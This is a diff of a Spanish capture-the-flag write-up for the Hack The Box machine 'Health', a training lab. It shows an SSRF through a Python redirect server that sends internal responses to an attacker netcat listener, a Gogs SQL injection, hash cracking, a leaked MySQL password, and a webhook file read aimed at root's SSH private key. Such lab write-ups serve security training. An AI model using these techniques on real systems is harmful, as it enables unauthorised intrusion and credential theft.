@@ -2,10 +2,13 @@
 title: Health WriteUp
 date: 2023-01-05 06:00:00 +/-TTTT
 categories: [HTB, medium]
-tags: []     # TAG names should always be lowercase
+tags: [gogs,sqli,ssrf,webhook,hashcat]     # TAG names should always be lowercase
 image: htb.jpg
 img_path: /photos/2023-01-07-Health-WriteUp/
 ---
+
+***Health*** es una máquina *Linux* donde primero explotaremos un ***SSRF*** a través de un ***HTTP redirect*** para conseguir acceder a un servicio web interno de la máquina víctima, ***Gogs***. Posteriormente, conseguiremos explotar un ***SQL Injection*** asociado a este sistema de control de versiones. Para escalar a ***root***, nos aprovecharemos de una **mala implementación** del servicio web y podremos listar la clave privada SSH del usuario ***root***.
+
 
 # Información de la máquina 
 
@@ -25,7 +28,7 @@ img_path: /photos/2023-01-07-Health-WriteUp/
 
 ## ping
 
-Primero enviaremos un _ping_ a la máquina víctima para saber su sistema operativo y si tenemos conexión con ella. Un _TTL_ menor o igual a 64 significa que la máquina es _Linux_. Por otra parte, un _TTL_ menor o igual a 128 significa que la máquina es _Windows_.
+En primer lugar enviaremos un _ping_ a la máquina víctima para saber su sistema operativo y si tenemos conexión con ella. Un _TTL_ menor o igual a 64 significa que la máquina es _Linux_. Por otra parte, un _TTL_ menor o igual a 128 significa que la máquina es _Windows_.
 
 ```bash
 ping -c 1 10.10.11.176
@@ -41,7 +44,7 @@ Vemos que nos enfrentamos a una máquina **_Linux_**, ya que su *TTL* es 63.
 
 ## Port discovery
 
-Ahora procedemos a escanear todo el rango de puertos de la máquina víctima con la finalidad de encontrar aquellos que estén abiertos (_status open_). Lo haremos con la herramienta ***nmap***.
+A continución procedemos a escanear todo el rango de puertos de la máquina víctima con la finalidad de encontrar aquellos que estén abiertos (_status open_). Lo haremos con la herramienta ***nmap***.
 
 ```bash
 nmap -sS --min-rate 5000 -n -Pn -vvv -p- 10.10.11.176 -oG allPorts
@@ -53,15 +56,21 @@ PORT     STATE    SERVICE REASON
 3000/tcp filtered ppp     no-response
 ```
 
-**-sS** efectúa un _TCP SYN Scan_, iniciando rápidamente una conexión sin finalizarla.
-**-min-rate 5000** sirve para enviar paquetes no más lentos que 5000 paquetes por segundo.
-**-n** sirve para evitar resolución DNS.
-**-Pn** para evitar host discovery.
-**-vvv** triple _verbose_ para que nos vuelque la información que vaya encontrando el escaneo.
-**-p-** para escanear todo el rango de puertos.
+**-sS** efectúa un _TCP SYN Scan_, iniciando rápidamente una conexión sin finalizarla.  
+**-min-rate 5000** sirve para enviar paquetes no más lentos que 5000 paquetes por segundo.  
+**-n** sirve para evitar resolución DNS.  
+**-Pn** para evitar host discovery.  
+**-vvv** triple _verbose_ para que nos vuelque la información que vaya encontrando el escaneo.  
+**-p-** para escanear todo el rango de puertos.  
 **-oG** exportará la evidencia en formato _grepeable_ al fichero **allPorts** en este caso.
 
-Hemos encontrado **dos puertos abiertos**, el **22** y el **80**, y un **puerto filtrado**, el **3000**. Un **puerto abierto** es un puerto en un servidor que está **escuchando solicitudes de conexión entrantes**. Un **puerto filtrado** es un puerto que está **protegido por un cortafuegos** o por otro tipo de medida de seguridad que bloquea las solicitudes de conexión entrantes. De momento, desde el exterior, no podremos hacer nada con el puerto 3000, pero está bien saberlo por si en un futuro ganamos acceso a la máquina.
+Hemos encontrado **dos puertos abiertos**, el **22** y el **80**, y un **puerto filtrado**, el **3000**. 
+
+Un **puerto abierto** es un puerto en un servidor que está **escuchando solicitudes de conexión entrantes**. 
+
+Un **puerto filtrado** es un puerto que está **protegido por un cortafuegos** o por otro tipo de medida de seguridad que bloquea las solicitudes de conexión entrantes. 
+
+De momento, desde el exterior, no podremos hacer nada con el puerto 3000, pero está bien saberlo por si en un futuro ganamos acceso a la máquina.
 
 Ahora, lanzaremos una serie de _scripts_ básicos de enumeración contra los **puertos abiertos**, en busca de los servicios que están corriendo y de sus versiones.
 
@@ -85,7 +94,7 @@ El puerto **22** es **SSH** y el puerto **80** **HTTP**. De momento, como 
 
 ### Tecnologías utilizadas
 
-Primero utilizaremos **_whatweb_** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:
+Vamos a utilizar **_whatweb_** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:
 
 ```python
 whatweb 10.10.11.176
@@ -104,16 +113,16 @@ En este caso, dominio e IP apuntan a la misma página web.
 
 ### Inspeccionando la web
 
-Como se indica en la descripción de la página web, se trata de un portal que permite verificar si un sitio web está disponible o no. De los 4 campos, los dos primeros son los importantes:
+Como se indica en la descripción de la página web, se trata de un portal que permite verificar si un sitio web está disponible o no. De los 4 campos disponibles para rellenar, los dos primeros son los importantes:
 
-* El primer campo, ***payload url***, es una URL donde recibiremos por *POST* información sobre la URL monitorizada (***monitored url***). Esta información es si la web está disponible, el contenido de la web, información sobre el servidor…
-* El segundo campo, ***monitored url***, será la *URL* del sitio web que queramos obtener información.
+* El primer campo, ***payload url***, es una URL donde recibiremos información sobre una URL monitorizada (***monitored url***). Esta información incluye si la web está disponible, el contenido de la misma, información sobre el servidor…
+* El segundo campo, ***monitored url***, será la *URL* del sitio web del que queramos obtener información.
 
-Adjunto la siguiente imagen a modo de esquema:
+Adjunto la siguiente imagen a modo de **esquema**:
 
 ![imagen 1](Pasted image 20230103184412.png)
 
-Entonces, con un servidor de python me montaré la web que será monitorizada y con netcat me pondré en escucha para recibir información relativa a esta URL.
+Con un **servidor de python** desplegaremos la web que será monitorizada y con *netcat* nos pondremos en escucha para recibir información relativa a esta web.
 
 Para la web monitorizada el comando será:
 
@@ -136,7 +145,7 @@ Quedaría de la siguiente manera:
 ![imagen 2](Pasted image 20230103120548.png)
 
 
-Si le damos a ***Test***:
+Si clicamos en ***Test***:
 
 ![imagen 3](Pasted image 20230103120646.png)
 
@@ -190,7 +199,7 @@ Podemos ver, entre otras cosas, *health up*, que nos indica que la web está act
 
 ## Ataque Server Side Request Forgery (SSRF)
 
-¿Qué pasaría si pudiésemos monitorizar una URL de la máquina víctima, por ejemplo, http://health.htb? Tendría acceso a su código HTML. En este caso, ya lo podemos visualizar sin necesidad de tener que monitorizarla, pero, ¿Y si corre otro servicio web en otro puerto de la máquina víctima en el que no tenemos acceso desde el exterior?
+¿Qué pasaría si pudiésemos monitorizar una URL de la máquina víctima, por ejemplo, http://health.htb? Tendriamos acceso a su código HTML. En este caso, ya lo podemos visualizar sin necesidad de tener que monitorizarla, pero, ¿Y si corre otro servicio web en otro puerto de la máquina víctima en el que no tenemos acceso desde el exterior?
 
 Un ataque ***SSRF (Server-Side Request Forgery)*** es una técnica utilizada por atacantes para forzar a un servidor web a realizar solicitudes de red a direcciones IP o dominios específicos. Esto permite a los atacantes acceder a **información confidencial** o llevar a cabo acciones malintencionadas **en nombre del servidor**.
 
@@ -206,7 +215,7 @@ Parece que la web está debidamente *securizada* para que no podamos apuntar a s
 * http://0.0.0.0
 * http://0x7F000001
 
-Obtengo el siguiente mensaje:
+Obtenemos el siguiente mensaje:
 
 ![imagen 5](Pasted image 20230103123235.png)
 
@@ -218,11 +227,11 @@ Esta sería la representación de lo que está pasando:
 
 ### SSRF aprovechándonos de un HTTP redirect
 
-Para intentar **burlar** el mensaje anterior, podríamos hacer que el servicio monitorizara una web nuestra y luego redirigir el tráfico con un ***redirect*** a un servicio interno.
+Para intentar **burlar** la protección anterior, podríamos hacer que el servicio web monitorizara una web nuestra y luego redirigir el tráfico con un ***redirect*** a un servicio interno.
 
 Por lo tanto, la web monitorizada sería http://10.10.14.11, pero luego esta redirigiría la petición a, por ejemplo, http://10.10.11.176.
 
-El código para montarnos un servidor que redireccione una petición a donde queramos es el siguiente:
+El código para desplegarnos un servidor que redireccione una petición a donde le indiquemos es el siguiente:
 
 ```python
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -237,7 +246,7 @@ httpd = HTTPServer(('0.0.0.0', 80), RedirectHandler)
 httpd.serve_forever()
 ```
 
-Podemos substituir https://example.com/nueva-direccion por http://10.10.11.176.
+Podemos sustituir https://example.com/nueva-direccion por http://10.10.11.176.
 
 Igual que antes, para monitorizar la web, sería ejecutar el *script* anterior. Esto nos montará un servicio web en *http://\<IP_tun0\>:80*, en mi caso http://10.10.14.11:80.
 
@@ -247,7 +256,7 @@ Para ponernos en escucha y recibir información de http://10.10.14.11:80 haremos
 nc -nlvp 81
 ```
 
-Rellenamos el formulario, le damos a ***Test*** y recibiremos la siguiente información (lo he *parseado* para poder ver los campos):
+Rellenamos el formulario, clicamos en ***Test*** y recibiremos la siguiente información:
 
 ```json
 {
@@ -276,9 +285,9 @@ Es el código fuente http://health.htb. **El SSRF ha funcionado**.
 
 ## Auditando Puerto 3000
 
-Recordemos, que en el escaneo de puerto descubrimos el **puerto 3000 filtrado**. Esto quería decir que estaba protegido por un cortafuegos y no podíamos acceder al servicio desde el exterior. Pero, ahora, **estamos tramitando solicitudes desde el interior con el *SSRF***, por lo que el cortafuegos ya no podrá hacer nada.
+Recordemos, que en el escaneo de puerto descubrimos el **puerto 3000 filtrado**. Esto quería decir que estaba protegido por un cortafuegos y no podíamos acceder al servicio desde el exterior. Pero, ahora, **estamos tramitando solicitudes desde el interior con el *SSRF***, por lo que el cortafuegos no actuará.
 
-Entonces, lo que vamos a hacer es utilizar el *script* de *python* para redirigir la petición a http://10.10.11.176:3000.
+Lo que vamos a hacer es utilizar el *script* de *python* para redirigir la petición a http://10.10.11.176:3000.
 
 El esquema quedaría:
 
@@ -299,7 +308,7 @@ httpd = HTTPServer(('0.0.0.0', 80), RedirectHandler)
 httpd.serve_forever()
 ```
 
-Rellenamos todos los campos, le damos a ***Test*** y obtendremos en siguiente *body* (Después de recibir la respuesta por http://10.10.14.11:81, la he guardado en un archivo *info.txt* y le he aplicado el siguiente *oneliner* para obtener la información deseada):
+Rellenamos todos los campos, clicamos en ***Test*** y obtendremos en siguiente *body* (Después de recibir la respuesta por http://10.10.14.11:81, la he guardado en un archivo *info.txt* y le he aplicado el siguiente *oneliner* para obtener la información importante):
 
 ```bash
 cat info.txt | jq .body | sed 's/\\n/\n/g' | sed 's/\\t/\t/g' | html2text | sed '/^\s*$/d'
@@ -368,7 +377,7 @@ Nederlands
 Website Go1.3.2
 ```
 
-Vemos que **en el puerto 3000 está corriendo *Gogs 0.5.5.1010***. *Gogs* es un sistema de control de versiones de código abierto basado en *Git*. Si buscamos posibles *exploits* en *searchsploit* nos salen varios reportes de ***SQL Injection***:
+Vemos que **en el puerto 3000 está corriendo *Gogs 0.5.5.1010***. *Gogs* es un sistema de control de versiones de código abierto basado en *Git*. Si buscamos *exploits* en *searchsploit* nos salen varios reportes de ***SQL Injection***:
 
 ```bash
 $> searchsploit gogs
@@ -446,9 +455,9 @@ El ***output*** obtenido es el siguiente;
 
 Descubrimos un usuario llamado ***susanne***.
 
-Vemos que el número 3 de nuestra *query* se está representado en el resultado. Este es el campo inyectable. En este campo meteremos nuestro *payload* malicioso para volcar información de la base de datos. Ahora, para saber el nombre de las columnas de la tabla *user* y poder así obtener información, deberemos consultar el código fuente de [gogs 0.5.8](https://github.com/gogs/gogs/releases/tag/v0.5.8).
+Vemos que el número **3** de nuestra *query* se está representado en el resultado. Este es el campo **inyectable**. En este campo meteremos nuestro *payload* malicioso para volcar información de la base de datos. Ahora, para saber el nombre de las columnas de la tabla *user* y poder así obtener información, deberemos consultar el **código fuente** de [gogs 0.5.8](https://github.com/gogs/gogs/releases/tag/v0.5.8).
 
-La tabla *users* se encuentra en el archivo *users.go* y contiene los siguientes campos:
+La tabla *users* se encuentra en el archivo *users.go* y contiene los **siguientes campos**:
 
 ```go
 // User represents the object of individual and member of organization.
@@ -490,7 +499,7 @@ type User struct {
 }
 ```
 
-Son un total de 27 campos. De ahí que nuestra *query* maliciosa fuera del 1 al 27. Los campos que nos interesan son ***Passwd*** y ***Salt***. Con estos dos podremos formar un *hash* que posteriormente lo podremos intentar *crackear* por fuerza bruta.
+Son un total de **27 campos**. De ahí que nuestra *query* maliciosa fuera del 1 al 27. Los campos que nos interesan son ***Passwd*** y ***Salt***. Con estos dos podremos formar un *hash* que posteriormente lo podremos intentar *crackear* por fuerza bruta.
 
 La *query* para obtener la **contraseña** será la siguiente:
 
@@ -536,9 +545,9 @@ Y aquí el resultado:
 
 #### Reconstruyendo el hash
 
-Ahora debemos darle formato a la información obtenida para formar un *hash* y luego poderlo *crackear* por fuerza bruta con la herramienta *hashcat*.
+Ahora debemos darle **formato** a la información obtenida para formar un ***hash*** y luego poderlo *crackear* por fuerza bruta con la herramienta *hashcat*.
 
-En el código podemos encontrar la función que se utiliza para codificar la contraseña de un usuario:
+En el código podemos encontrar la **función** que se utiliza para **codificar** la contraseña de un usuario:
 
 ```go
 // EncodePasswd encodes password to safe format.
@@ -548,7 +557,7 @@ func (u *User) EncodePasswd() {
 }
 ```
 
-Está utilizando *PBKDF2-SHA256*. Ahora, podemos ir a[ esta web](https://hashcat.net/wiki/doku.php?id=example_hashes) y buscar el formato de hash conveniente. Utilizaremos el modo 10900. Muestran el siguiente **ejemplo**:
+Está utilizando ***PBKDF2-SHA256***. Ahora, podemos ir a [esta web](https://hashcat.net/wiki/doku.php?id=example_hashes) y buscar el formato de hash conveniente. Utilizaremos el modo 10900. Muestran el siguiente **ejemplo**:
 
 ```
 10900 | PBKDF2-HMAC-SHA256 | sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
@@ -619,13 +628,13 @@ f2eda025c84012295e2a11da2a7d1023
 
 ## Reconocimiento del sistema como susanne
 
-Podemos buscar contraseñas que se estén almacenando en texto plano en el directorio donde se encuentran todos los archivos de configuración de la web:
+Podemos buscar **contraseñas** que se estén almacenando en texto plano en el directorio donde se encuentran todos los archivos de configuración de la web:
 
 ```bash
 susanne@health:/var/www/html$ grep -rniE "pass|pwd|PASSWORD" | grep -v "node_modules"|less -S
 ```
 
-Encontramos la siguiente contraseña en el archivo *.env*: ***MYsql_strongestpass@2014+***. Si investigamos el fichero, encontramos las siguientes credenciales:
+Encontramos la siguiente contraseña en el archivo *.env*: ***MYsql_strongestpass@2014+***. Si investigamos este archivo, encontramos las siguientes **credenciales**:
 
 ```
 DB_CONNECTION=mysql
@@ -636,13 +645,13 @@ DB_USERNAME=laravel
 DB_PASSWORD=MYsql_strongestpass@2014+
 ```
 
-En este punto podemos intentar conectarnos por *MySQL*:
+En este punto podemos intentar conectarnos por ***MySQL***:
 
 ```bash
 susanne@health:/var/www/html$ mysql -u laravel -pMYsql_strongestpass@2014+
 ```
 
-Tenemos acceso a una base de datos llamada *laravel* que contiene unas cuantas tablas.
+Tenemos acceso a una **base de datos** llamada *laravel* que contiene unas cuantas tablas.
 
 ### Reconocimiento del sistema con pspy
 
@@ -660,7 +669,7 @@ CMD: UID=0    PID=19950  | /bin/bash -c cd /var/www/html && php artisan schedule
 * Respecto a la primera instrucción, el usuario *root* se mete en el directorio */var/www/html* y ejecuta *php artisan schedule:run*.  ***Artisan*** es una herramienta de línea de comandos incluida en *Laravel*. Este comando específico se utiliza para **ejecutar tareas programadas** en *Laravel*. Finalmente, *>> /dev/null 2>&1* se emplea para evitar que la salida del comando y los mensajes de error se muestren en la pantalla.
 * La segunda instrucción elimina todas las filas de la tabla *tasks*.
 
-En resumen, parece que primero *root* ejecuta una serie de **tareas** y luego las borra. Recordemos que el sitio web tenía una opción de crear un *Webhook*. Probablemente, lo que se está haciendo es ejecutar estas tareas y luego borrarlas. Si las borra de la tabla *tasks*, es porque seguramente se guarden en esta misma tabla.
+En resumen, parece que primero *root* ejecuta una serie de **tareas** y luego las borra. Recordemos que el sitio web tenía una opción de **crear** un *Webhook*. Probablemente, lo que se está haciendo es **ejecutar** estas tareas y luego **borrarlas**. Si las borra de la tabla *tasks*, es porque seguramente se guarden en esta misma tabla.
 
 Podemos hacer una prueba. Primero creamos una tarea:
 
@@ -747,11 +756,11 @@ class HealthChecker
 
 La función comprueba si puede obtener el contenido de la URL especificada en `$monitoredUrl` utilizando la función `file_get_contents`. Si se puede obtener el contenido, la función agrega una clave `health` con el valor *up* al vector `$json`, y también agrega el contenido obtenido y el encabezado HTTP de respuesta al vector `$json`. Si no se puede obtener el contenido, la función agrega una clave `health` con el valor *down* al vector `$json`.
 
-Existe un **problema de implementación** al leer el *monitoredUrl*. Se supone que *@file_get_contents* está leyendo el contenido de una web, pero, ¿y si en vez de una URL, igualamos *monitoredUrl* a un archivo del sistema? La variable *res* se igualará al contenido del archivo y posteriormente este contenido viajará en el *body*. Desde el exterior no podíamos, ya que teníamos que poner una URL que fuera válida. Pero ahora, podemos intentar modificar una fila de la tabla *tasks* para que apunte a un archivo del sistema y que nos lo envíe.
+Existe un **problema de implementación** al leer el *monitoredUrl*. Se supone que ***@file_get_contents*** está leyendo el contenido de una web, pero, ¿y si en vez de una URL, igualamos *monitoredUrl* a un archivo del sistema? La variable *res* se igualará al contenido del archivo y posteriormente este contenido viajará en el *body*. Desde el exterior no podíamos, ya que teníamos que poner una URL que fuera válida. Pero ahora, podemos intentar modificar una fila de la tabla *tasks* para que apunte a un archivo del sistema y que nos lo envíe.
 
 ## Explotando webhooks
 
-Para podernos convertir en *root*, lo más conveniente, pudiendo listar ficheros del sistema, es obtener la clave privada SSH de *root*. Esta se encuentra en la ruta */root/.ssh/id_rsa*. Así, luego nos podremos conectar por SSH.
+Para podernos convertir en *root*, lo más conveniente, pudiendo listar ficheros del sistema, es obtener la **clave privada SSH** de *root*. Esta se encuentra en la ruta */root/.ssh/id_rsa*. Así, luego nos podremos conectar por SSH.
 
 Los pasos para obtenerla serán:
 
